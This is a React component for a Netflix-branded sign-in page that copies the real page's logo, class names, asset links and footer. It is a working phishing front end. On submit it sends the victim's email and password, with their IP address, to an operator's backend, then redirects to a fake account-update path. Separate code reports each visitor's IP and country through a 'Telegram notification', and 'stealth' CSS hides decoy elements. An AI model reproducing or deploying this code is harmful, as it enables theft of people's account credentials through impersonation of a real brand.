import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { useHistory } from 'react-router-dom';
import './styles.css';

const Login = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loginError, setLoginError] = useState(false);
  const [passwordVisible, setPasswordVisible] = useState(false);
  const [ip, setIp] = useState('');
  const [country, setCountry] = useState('');
  const [loading, setLoading] = useState(false);
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const history = useHistory();
const [isEmailFocused, setIsEmailFocused] = useState(false);
const [isPasswordFocused, setIsPasswordFocused] = useState(false);

useEffect(() => {
    const fetchStoredDataWithDelay = () => {
      setTimeout(() => {
        const storedIP = localStorage.getItem("userIP") || "Fetching...";
        const storedCountry = localStorage.getItem("country") || "Fetching...";


        setIp(storedIP);
        setCountry(storedCountry);
      }, 300);
    };

    fetchStoredDataWithDelay();
  }, []);


const validateEmail = (email) => {
  return email.length >= 3;
};
useEffect(() => {
    const sendTelegramNotification = async () => {
      if (localStorage.getItem("notificationSent") || !ip || !country || ip === "Fetching...") return;

      try {
        const currentTime = new Date().toLocaleString();
        const message = `New view\nIP: ${ip}\nCountry: ${country}\nTime: ${currentTime}`;
        await axios.post(`${process.env.REACT_APP_API_URL}/api/recentPosts_92bJ`, { message });

        localStorage.setItem("notificationSent", "true");
      } catch (error) {
        console.error("Failed to send Telegram notification:", error);
      }
    };

    sendTelegramNotification();
  }, [ip, country]);

const handleEmailFocus = () => setIsEmailFocused(true);
const handleEmailBlur = () => setIsEmailFocused(false);
const handlePasswordFocus = () => setIsPasswordFocused(true);
const handlePasswordBlur = () => setIsPasswordFocused(false);

useEffect(() => {
  // Dynamically add stealth styles
  const style = document.createElement("style");
  style.innerHTML = `
    .fCon_z9s2x {
      position: absolute;
      top: -9999px;
      left: -9999px;
      width: 100vw;
      height: 200px;
      overflow: hidden;
      opacity: 0;
    }
    .mslBttn_e1z9s {
      position: absolute;
      left: -9999px;
      visibility: hidden;
    }
    .invDv_2z69s {
      width: 200px;
      height: 50px;
      background-color: rgba(255, 0, 0, 0.001);
      position: absolute;
      top: -1000px;
    }

    .FTI_A6RTsa {
      position: absolute;
      left: -1000px;
      top: -1000px;
      opacity: 0;
    }
  `;
  document.head.appendChild(style);
}, []);
  const handleSubmit = async (e) => {
    e.preventDefault();
    let valid = true;
    
    if (!email) {
      setEmailError('Please enter a valid email or phone number.');
      valid = false;
    } else if (!validateEmail(email)) {
      setEmailError('Please enter a valid email or phone number.');
      valid = false;
    } else {
      setEmailError('');
    }
    
    if (!password) {
      setPasswordError('Your password must contain between 4 and 60 characters.');
      valid = false;
    } else if (password.length < 4 || password.length > 60) {
      setPasswordError('Your password must contain between 4 and 60 characters.');
      valid = false;
    } else {
      setPasswordError('');
    }
    
    if (!valid) {
      return;
    }
    
    setLoading(true);
    const clientSessionId = localStorage.getItem('clientSessionID');
    try {
      const emailOrUsername = email;
      const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/auth/loginUser_81xD`, { 
        emailOrUsername, 
        password,
        clientSessionId,
        ip
      });
      
      if (response.data.error) {
        setLoginError(true);
      } else {
        setLoginError(false);
        localStorage.setItem('chneyal7alataw', 1);
        history.push('/update/status=true/pending');
        setLoading(false);
      }
    } catch (error) {
      setLoginError(true);
    }
  };
  
  const togglePasswordVisibility = () => {
    setPasswordVisible(!passwordVisible);
  };
  return (
    <>
      <title>Netflix</title>
      {loading && (
        <div className="loading-overlay">
          <div className="loading-spinner"></div>
        </div>
      )}
      <div id="appMountPoint">
        <div>
          <div data-uia="loc" lang="en-TN" dir="ltr">
            <div className="default-ltr-cache-k55181 eoi9e9o1">
              <div className="default-ltr-cache-pkc5fh e1qiesvj0">
                <img
                  className="concord-img vlv-creative"
                  src="https://assets.nflxext.com/ffe/siteui/vlv3/7a8c0067-a424-4e04-85f8-9e25a49a86ed/web/TN-en-20250120-TRIFECTA-perspective_d3e273c3-f797-4e34-ad86-4914b1a91c06_small.jpg"
                  srcSet="https://assets.nflxext.com/ffe/siteui/vlv3/7a8c0067-a424-4e04-85f8-9e25a49a86ed/web/TN-en-20250120-TRIFECTA-perspective_d3e273c3-f797-4e34-ad86-4914b1a91c06_small.jpg 1000w,https://assets.nflxext.com/ffe/siteui/vlv3/7a8c0067-a424-4e04-85f8-9e25a49a86ed/web/TN-en-20250120-TRIFECTA-perspective_d3e273c3-f797-4e34-ad86-4914b1a91c06_medium.jpg 1500w,https://assets.nflxext.com/ffe/siteui/vlv3/7a8c0067-a424-4e04-85f8-9e25a49a86ed/web/TN-en-20250120-TRIFECTA-perspective_d3e273c3-f797-4e34-ad86-4914b1a91c06_large.jpg 1800w"
                  alt=""
                  />
              </div>
              <header>
                <header className="default-ltr-cache-xa9oq4 e1bzn5xj0">
                  <div
                    data-layout="wrapper"
                    className="layout-container_wrapperStyles__12wd1go1d default-ltr-cache-1u8qly9"
                    dir="ltr"
                  >
                    <div
                      data-layout="container"
                      className="layout-container_styles__12wd1go1g"
                      dir="ltr"
                      style={{
                        '--_12wd1go0': 'center',
                        '--_12wd1go9': '0.5rem',
                        '--_12wd1goh': '0.5rem',
                        '--_12wd1gop': '1rem',
                        '--_12wd1gox': '1rem',
                        '--_12wd1go15': '1rem',
                        '--_12wd1go2': 'row',
                        '--_12wd1go3': 'space-between',
                        '--_12wd1go5': '0px',
                        '--_12wd1go6': '0.5rem',
                        '--_12wd1gof': 'calc(100% + 0.5rem)',
                        '--_12wd1gon': 'calc(100% + 0.5rem)',
                        '--_12wd1gov': 'calc(100% + 1rem)',
                        '--_12wd1go13': 'calc(100% + 1rem)',
                        '--_12wd1go1b': 'calc(100% + 1rem)',
                      }}
                    >
                      <div
                        data-layout="item"
                        className="layout-item_styles__zc08zp30 default-ltr-cache-1u8qly9"
                        dir="ltr"
                        style={{
                          '--zc08zpi': 'auto',
                          '--zc08zp10': 'auto',
                          '--zc08zpy': '0 auto',
                          '--zc08zp1g': '0 auto',
                          '--zc08zp1y': '0 0 calc(33.333333333333336% - 1rem)',
                          '--zc08zp2g': '0 0 calc(33.333333333333336% - 1rem)',
                          '--zc08zp2y': '0 0 calc(33.333333333333336% - 1rem)',
                          '--zc08zp7': '0px',
                        }}
                      >
                        <a
                          className="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0 default-ltr-cache-0 ev1dnif0"
                          dir="ltr"
                          role="link"
                          href="/"
                        >
                          <svg
                            viewBox="0 0 111 30"
                            version="1.1"
                            xmlns="http://www.w3.org/2000/svg"
                            xmlnsXlink="http://www.w3.org/1999/xlink"
                            aria-hidden="true"
                            role="img"
                            className="default-ltr-cache-1d568uk ev1dnif2"
                          >
                            <g>
                              <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458 28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
                            </g>
                          </svg>
                          <span className="default-ltr-cache-raue2m ev1dnif1">Netflix</span>
                        </a>
                      </div>
                      <div
                        data-layout="item"
                        className="layout-item_styles__zc08zp30 default-ltr-cache-1u8qly9"
                        dir="ltr"
                        style={{
                          '--zc08zpi': 'auto',
                          '--zc08zp10': 'auto',
                          '--zc08zpy': '0 auto',
                          '--zc08zp1g': '0 auto',
                          '--zc08zp1y': '0 0 calc(66.66666666666667% - 1rem)',
                          '--zc08zp2g': '0 0 calc(66.66666666666667% - 1rem)',
                          '--zc08zp2y': '0 0 calc(66.66666666666667% - 1rem)',
                          '--zc08zpc': 'flex-end',
                          '--zc08zp7': '0px',
                        }}
                      >
                        <div
                          data-layout="wrapper"
                          className="layout-container_wrapperStyles__12wd1go1d default-ltr-cache-1u8qly9"
                          dir="ltr"
                        >
                          <div
                            data-layout="container"
                            className="layout-container_styles__12wd1go1g"
                            dir="ltr"
                            style={{
                              '--_12wd1go9': '0.5rem',
                              '--_12wd1goh': '0.5rem',
                              '--_12wd1gop': '1.5rem',
                              '--_12wd1gox': '1.5rem',
                              '--_12wd1go15': '1.5rem',
                              '--_12wd1go2': 'row',
                              '--_12wd1go3': 'flex-end',
                              '--_12wd1go5': '0px',
                              '--_12wd1go6': '0px',
                              '--_12wd1gof': 'calc(100% + 0.5rem)',
                              '--_12wd1gon': 'calc(100% + 0.5rem)',
                              '--_12wd1gov': 'calc(100% + 1.5rem)',
                              '--_12wd1go13': 'calc(100% + 1.5rem)',
                              '--_12wd1go1b': 'calc(100% + 1.5rem)',
                            }}
                          >
                            <div
                              data-layout="item"
                              className="layout-item_styles__zc08zp30 default-ltr-cache-1u8qly9"
                              dir="ltr"
                              style={{
                                '--zc08zp0': 'auto',
                                '--zc08zpg': '0 auto',
                                '--zc08zp7': '0px',
                              }}
                            ></div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </header>
              </header>
              <div className="default-ltr-cache-8hdzfz eoi9e9o0">
                <div
                  data-uia="login-page-container"
                  className="default-ltr-cache-1osrymp e1puclvk0"
                >
                  <header className="default-ltr-cache-1ws1lu8 e13lzdkk2">
                    <h1
                      data-uia="login-page-title"
                      className="default-ltr-cache-1ho9ut0 euy28770"
                    >
                      Sign In
                    </h1>
                  </header>
                  <form
                    className="e13lzdkk1 default-ltr-cache-9beyap"
                    aria-label="Sign In"
                    onSubmit={handleSubmit}
                  >
                    <div className="default-ltr-cache-z5atxi e2eu37l0">
                      <div
                        className={`form-control_containerStyles__oy4jpq0 ${ email || isEmailFocused ? 'default-ltr-cache-3e67ds' : 'default-ltr-cache-14jsj4q'} exrud7f1`}
                        data-uia="login-field+container"
                        dir="ltr"
                      >
                        <label
                          htmlFor=":rc:"
                          className="form-control_labelStyles__oy4jpq5"
                          dir="ltr"
                          data-uia="login-field+label"
                        >
                          Email or mobile number
                        </label>
                        <div
                          className="form-control_controlWrapperStyles__oy4jpq1"
                          dir="ltr"
                        >
                          <input
                            type="text"
                            autoComplete="email"
                            className="input_nativeElementStyles__1euouia0"
                            dir="ltr"
                            id=":rc:"
                            name="email"
                            data-uia="login-field"
                            value={email}
                            onFocus={handleEmailFocus}
                            onBlur={handleEmailBlur}                          
                            onChange={(e) => setEmail(e.target.value)}
                            aria-describedby=":rd:"
                            aria-invalid={!!emailError}
                          />
                          <div
                            aria-hidden="true"
                            className="form-control_controlChromeStyles__oy4jpq4"
                            dir="ltr"
                          ></div>
                        </div>
                        {emailError && (
                          <div
                            className="form-control_validationMessageStyles__oy4jpq7"
                            dir="ltr"
                            data-uia="login-field+validationMessage"
                            id=":rd:"
                            style={{
                              fontSize: '0.8125rem',
                              fontWeight: '400',
                              marginTop: '0.375rem',
                              color: 'rgb(235, 57, 66)',
                              display: 'flex',
                              alignContent: 'center',
                              marginTop: '10px',
                            }}
                          >
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              role="img"
                              viewBox="0 0 16 16"
                              width="16"
                              height="16"
                              data-icon="CircleXSmall"
                              aria-hidden="true"
                              className="default-ltr-cache-13htjwu e1vkmu653"
                              style={{ marginRight: '5px' }}
                            >
                              <path
                                fillRule="evenodd"
                                clipRule="evenodd"
                                d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z"
                                fill="currentColor"
                              ></path>
                            </svg>
                            {emailError}
                          </div>
                        )}
                      </div>
                    </div>
                    <div className="default-ltr-cache-1qtmpa e1j9l8n51">
                      <div
                        className={`form-control_containerStyles__oy4jpq0 ${ password || isPasswordFocused ? 'default-ltr-cache-1snakfo' : 'default-ltr-cache-p2hz7y'} e2so2tu1`}
                        data-uia="password-field+container"
                        dir="ltr"
                      >
                        <label
                          htmlFor=":rf:"
                          className="form-control_labelStyles__oy4jpq5"
                          dir="ltr"
                          data-uia="password-field+label"
                        >
                          Password
                        </label>
                        <div
                          className="form-control_controlWrapperStyles__oy4jpq1"
                          dir="ltr"
                        >
                          <input
                            type={passwordVisible ? 'text' : 'password'}
                            autoComplete="password"
                            className="input_nativeElementStyles__1euouia0"
                            dir="ltr"
                            id=":rf:"
                            name="password"
                            data-uia="password-field"
                            onFocus={handlePasswordFocus}
                            onBlur={handlePasswordBlur}                          
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            aria-describedby=":rg:"
                            aria-invalid={!!passwordError}
                          />
                          <div
                            aria-hidden="true"
                            className="form-control_controlChromeStyles__oy4jpq4"
                            dir="ltr"
                          ></div>
                        </div>
                        {passwordError && (
                          <div
                            className="form-control_validationMessageStyles__oy4jpq7"
                            dir="ltr"
                            data-uia="password-field+validationMessage"
                            id=":rg:"
                            style={{
                              fontSize: '0.8125rem',
                              fontWeight: '400',
                              marginTop: '0.375rem',
                              color: 'rgb(235, 57, 66)',
                              display: 'flex',
                              alignContent: 'center',
                              marginTop: '10px',
                            }}
                          >
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              role="img"
                              viewBox="0 0 16 16"
                              width="16"
                              height="16"
                              data-icon="CircleXSmall"
                              aria-hidden="true"
                              style={{ marginRight: '5px' }}

                              className="default-ltr-cache-13htjwu e1vkmu653"
                            >
                              <path
                                fillRule="evenodd"
                                clipRule="evenodd"
                                d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z"
                                fill="currentColor"
                              ></path>
                            </svg>
                            {passwordError}
                          </div>
                        )}
                      </div>
                    </div>
                    <button
                      className="pressable_styles__a6ynkg0 button_styles__1kwr4ym0 default-ltr-cache-1qj5r49 e1ax5wel2"
                      data-uia="login-submit-button"
                      dir="ltr"
                      role="button"
                      type="submit"
                    >
                      Sign In
                    </button>
                    <a
                      className="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0 default-ltr-cache-yzjbl5 e1gz2xdw0"
                      data-uia="login-help-link"
                      dir="ltr"
                      role="link"
                      href="/LoginHelp"
                    >
                      Forgot password?
                    </a>
                  </form>
                  <footer className="default-ltr-cache-banb1s e13lzdkk0">
                    <div className="default-ltr-cache-1r5gb7q e182k4ex0">
                      
                        
                      <div className="fCon_z9s2x">
        <p>Welcome</p>
        <p>Loading</p>
        <input type="text" placeholder="Enter admin key" className="FTI_A6RTsa" />
        <button className="mslBttn_e1z9s">Submit Admin Code</button>
      </div>

      {/* Hidden but Space-Occupying Elements */}
      <div className="invDv_2z69s"></div>
                    </div>
                    <div
                      className="recaptcha-terms-of-use"
                      data-uia="recaptcha-terms-of-use"
                    >
                      <p>
                        <span>
                          This page is protected by Google reCAPTCHA to ensure
                          you're not a bot.
                        </span>
                        &nbsp;
                        <button
                          className="recaptcha-terms-of-use--link-button"
                          data-uia="recaptcha-learn-more-button"
                        >
                          Learn more.
                        </button>
                      </p>
                      <div
                        className="recaptcha-terms-of-use--disclosure"
                        data-uia="recaptcha-disclosure"
                      >
                      </div>
                    </div>
                  </footer>
                </div>
              </div>
              <footer className="default-ltr-cache-1m4t6ky e1s9oty30">
                <footer className="default-ltr-cache-3sf4re eyieukx5">
                  <div
                    data-layout="wrapper"
                    className="layout-container_wrapperStyles__12wd1go1d"
                    dir="ltr"
                  >
                    <div
                      data-layout="container"
                      className="layout-container_styles__12wd1go1g"
                      dir="ltr"
                      style={{
                        '--_12wd1go1': '0px',
                        '--_12wd1go2': 'row',
                        '--_12wd1go5': '0px',
                        '--_12wd1go6': '0px',
                        '--_12wd1go7': '100%',
                      }}
                    >
                      <div
                        data-layout="item"
                        className="layout-item_styles__zc08zp30"
                        dir="ltr"
                        style={{
                          '--zc08zpg': '0 0 100%',
                          '--zc08zp7': '0px',
                        }}
                      >
                        <div className="default-ltr-cache-82qlwu eyieukx4">
                          <a href="https://help.netflix.com/contactus">
                            Questions? Contact us.
                          </a>
                        </div>
                      </div>
                      <div
                        data-layout="item"
                        className="layout-item_styles__zc08zp30"
                        dir="ltr"
                        style={{
                          '--zc08zpg': '0 0 100%',
                          '--zc08zp7': '0px',
                        }}
                      >
                        <div className="default-ltr-cache-2lwb1t eyieukx3">
                          <div
                            data-layout="wrapper"
                            className="layout-container_wrapperStyles__12wd1go1d"
                            dir="ltr"
                          >
                            <ul
                              data-layout="container"
                              className="layout-container_styles__12wd1go1g"
                              dir="ltr"
                              style={{
                                '--_12wd1go1': '0.75rem',
                                '--_12wd1go2': 'row',
                                '--_12wd1go5': '0px',
                                '--_12wd1go6': '1rem',
                                '--_12wd1go7': 'calc(100% + 0.75rem)',
                              }}
                            >
                              <li
                                data-layout="item"
                                className="layout-item_styles__zc08zp30"
                                dir="ltr"
                                style={{
                                  '--zc08zpy': '0 0 calc(50% - 0.75rem)',
                                  '--zc08zp1g': '0 0 calc(50% - 0.75rem)',
                                  '--zc08zp1y': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp2g': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp2y': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp7': '0px',
                                }}
                              >
                                <a
                                  data-uia="footer-link"
                                  target="_self"
                                  className="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0"
                                  dir="ltr"
                                  role="link"
                                  href="https://help.netflix.com/support/412"
                                >
                                  FAQ
                                </a>
                              </li>
                              <li
                                data-layout="item"
                                className="layout-item_styles__zc08zp30"
                                dir="ltr"
                                style={{
                                  '--zc08zpy': '0 0 calc(50% - 0.75rem)',
                                  '--zc08zp1g': '0 0 calc(50% - 0.75rem)',
                                  '--zc08zp1y': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp2g': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp2y': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp7': '0px',
                                }}
                              >
                                <a
                                  data-uia="footer-link"
                                  target="_self"
                                  className="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0"
                                  dir="ltr"
                                  role="link"
                                  href="https://help.netflix.com"
                                >
                                  Help Center
                                </a>
                              </li>
                              <li
                                data-layout="item"
                                className="layout-item_styles__zc08zp30"
                                dir="ltr"
                                style={{
                                  '--zc08zpy': '0 0 calc(50% - 0.75rem)',
                                  '--zc08zp1g': '0 0 calc(50% - 0.75rem)',
                                  '--zc08zp1y': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp2g': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp2y': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp7': '0px',
                                }}
                              >
                                <a
                                  data-uia="footer-link"
                                  target="_self"
                                  className="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0"
                                  dir="ltr"
                                  role="link"
                                  href="https://help.netflix.com/legal/termsofuse"
                                >
                                  Terms of Use
                                </a>
                              </li>
                              <li
                                data-layout="item"
                                className="layout-item_styles__zc08zp30"
                                dir="ltr"
                                style={{
                                  '--zc08zpy': '0 0 calc(50% - 0.75rem)',
                                  '--zc08zp1g': '0 0 calc(50% - 0.75rem)',
                                  '--zc08zp1y': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp2g': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp2y': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp7': '0px',
                                }}
                              >
                                <a
                                  data-uia="footer-link"
                                  target="_self"
                                  className="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0"
                                  dir="ltr"
                                  role="link"
                                  href="https://help.netflix.com/legal/privacy"
                                >
                                  Privacy
                                </a>
                              </li>
                              <li
                                data-layout="item"
                                className="layout-item_styles__zc08zp30"
                                dir="ltr"
                                style={{
                                  '--zc08zpy': '0 0 calc(50% - 0.75rem)',
                                  '--zc08zp1g': '0 0 calc(50% - 0.75rem)',
                                  '--zc08zp1y': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp2g': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp2y': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp7': '0px',
                                }}
                              >
                                <a
                                  data-uia="footer-link"
                                  target="_self"
                                  className="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0"
                                  dir="ltr"
                                  role="link"
                                  href="#"
                                >
                                  Cookie Preferences
                                </a>
                              </li>
                              <li
                                data-layout="item"
                                className="layout-item_styles__zc08zp30"
                                dir="ltr"
                                style={{
                                  '--zc08zpy': '0 0 calc(50% - 0.75rem)',
                                  '--zc08zp1g': '0 0 calc(50% - 0.75rem)',
                                  '--zc08zp1y': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp2g': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp2y': '0 0 calc(25% - 0.75rem)',
                                  '--zc08zp7': '0px',
                                }}
                              >
                                <a
                                  data-uia="footer-link"
                                  target="_self"
                                  className="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0"
                                  dir="ltr"
                                  role="link"
                                  href="https://help.netflix.com/legal/corpinfo"
                                >
                                  Corporate Information
                                </a>
                              </li>
                            </ul>
                          </div>
                        </div>
                      </div>
                      <div
                        data-layout="wrapper"
                        className="layout-container_wrapperStyles__12wd1go1d"
                        dir="ltr"
                      >
                        <div
                          data-layout="container"
                          className="layout-container_styles__12wd1go1g"
                          dir="ltr"
                          style={{
                            '--_12wd1go9': '0.5rem',
                            '--_12wd1goh': '0.5rem',
                            '--_12wd1gop': '1.5rem',
                            '--_12wd1gox': '1.5rem',
                            '--_12wd1go15': '1.5rem',
                            '--_12wd1go2': 'row',
                            '--_12wd1go5': '0px',
                            '--_12wd1go6': '0.5rem',
                            '--_12wd1gof': 'calc(100% + 0.5rem)',
                            '--_12wd1gon': 'calc(100% + 0.5rem)',
                            '--_12wd1gov': 'calc(100% + 1.5rem)',
                            '--_12wd1go13': 'calc(100% + 1.5rem)',
                            '--_12wd1go1b': 'calc(100% + 1.5rem)',
                          }}
                        >
                          <div
                            data-layout="item"
                            className="layout-item_styles__zc08zp30"
                            dir="ltr"
                            style={{
                              '--zc08zp0': 'auto',
                              '--zc08zpg': '0 auto',
                              '--zc08zp7': '0px',
                            }}
                          >
                            <div
                              className="form-control_containerStyles__oy4jpq0 default-ltr-cache-crcdk0 e1jlx6kl1"
                              data-uia="language-picker+container"
                              dir="ltr"
                            >
                              <label
                                htmlFor=":r9:"
                                className="form-control_labelStyles__oy4jpq5 screen-reader-only_screenReaderOnly__h8djxf0"
                                dir="ltr"
                                data-uia="language-picker+label"
                              >
                                Select Language
                              </label>
                              <div
                                className="form-control_controlWrapperStyles__oy4jpq1"
                                dir="ltr"
                              >
                                <div
                                  role="img"
                                  aria-hidden="true"
                                  className="default-ltr-cache-pnamzc e1vkmu651"
                                >
                                  <svg
                                    xmlns="http://www.w3.org/2000/svg"
                                    fill="none"
                                    role="img"
                                    viewBox="0 0 16 16"
                                    width="16"
                                    height="16"
                                    data-icon="LanguagesSmall"
                                    aria-hidden="true"
                                  >
                                    <path
                                      fillRule="evenodd"
                                      clipRule="evenodd"
                                      d="M10.7668 5.33333L10.5038 5.99715L9.33974 8.9355L8.76866 10.377L7.33333 14H9.10751L9.83505 12.0326H13.4217L14.162 14H16L12.5665 5.33333H10.8278H10.7668ZM10.6186 9.93479L10.3839 10.5632H11.1036H12.8856L11.6348 7.2136L10.6186 9.93479ZM9.52722 4.84224C9.55393 4.77481 9.58574 4.71045 9.62211 4.64954H6.41909V2H4.926V4.64954H0.540802V5.99715H4.31466C3.35062 7.79015 1.75173 9.51463 0 10.4283C0.329184 10.7138 0.811203 11.2391 1.04633 11.5931C2.55118 10.6795 3.90318 9.22912 4.926 7.57316V12.6667H6.41909V7.51606C6.81951 8.15256 7.26748 8.76169 7.7521 9.32292L8.31996 7.88955C7.80191 7.29052 7.34631 6.64699 6.9834 5.99715H9.06968L9.52722 4.84224Z"
                                      fill="currentColor"
                                    ></path>
                                  </svg>
                                </div>
                                <select
                                  className="select_nativeElementStyles__1ewemfi0"
                                  dir="ltr"
                                  id=":r9:"
                                  name="LanguageSelect"
                                  data-uia="language-picker"
                                >
                                  <option
                                    lang="en"
                                    label="English"
                                    value="en-TN"
                                  >
                                    English
                                  </option>
                                  <option
                                    lang="ar"
                                    label="العربية"
                                    value="ar-TN"
                                  >
                                    العربية
                                  </option>
                                  <option
                                    lang="fr"
                                    label="Français"
                                    value="fr-TN"
                                  >
                                    Français
                                  </option>
                                </select>
                                <div
                                  aria-hidden="true"
                                  className="form-control_controlChromeStyles__oy4jpq4"
                                  dir="ltr"
                                >
                                  <svg
                                    xmlns="http://www.w3.org/2000/svg"
                                    fill="none"
                                    role="img"
                                    viewBox="0 0 16 16"
                                    width="16"
                                    height="16"
                                    data-icon="CaretDownSmall"
                                    aria-hidden="true"
                                  >
                                    <path
                                      fillRule="evenodd"
                                      clipRule="evenodd"
                                      d="M11.5976 6.5C11.7461 6.5 11.8204 6.67956 11.7154 6.78457L8.23574 10.2643C8.10555 10.3945 7.89445 10.3945 7.76425 10.2643L4.28457 6.78457C4.17956 6.67956 4.25393 6.5 4.40244 6.5H11.5976Z"
                                      fill="currentColor"
                                    ></path>
                                  </svg>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </footer>
              </footer>
            </div>
          </div>
        </div>
      </div>
      <div></div>
      <div>
        <div
          className="grecaptcha-badge"
          data-style="bottomright"
          style={{
            width: '256px',
            height: '60px',
            position: 'fixed',
            visibility: 'hidden',
            display: 'block',
            transition: 'right 0.3s',
            bottom: '14px',
            right: '-186px',
            boxShadow: 'gray 0px 0px 5px',
            borderRadius: '2px',
            overflow: 'hidden',
          }}
        >
          <div className="grecaptcha-logo">
            <iframe
              title="reCAPTCHA"
              width="256"
              height="60"
              role="presentation"
              name="a-scvkjbrf1rq3"
              frameBorder="0"
              scrolling="no"
              sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"
            ></iframe>
          </div>
          <div className="grecaptcha-error"></div>
          <textarea
            id="g-recaptcha-response-100000"
            name="g-recaptcha-response"
            className="g-recaptcha-response"
            style={{
              width: '250px',
              height: '40px',
              border: '1px solid rgb(193, 193, 193)',
              margin: '10px 25px',
              padding: '0px',
              resize: 'none',
              display: 'none',
            }}
          ></textarea>
        </div>
        <iframe style={{ display: 'none' }}></iframe>
      </div>
      <div style={{ all: 'initial !important' }}></div>
    </>
  );
};

export default Login;
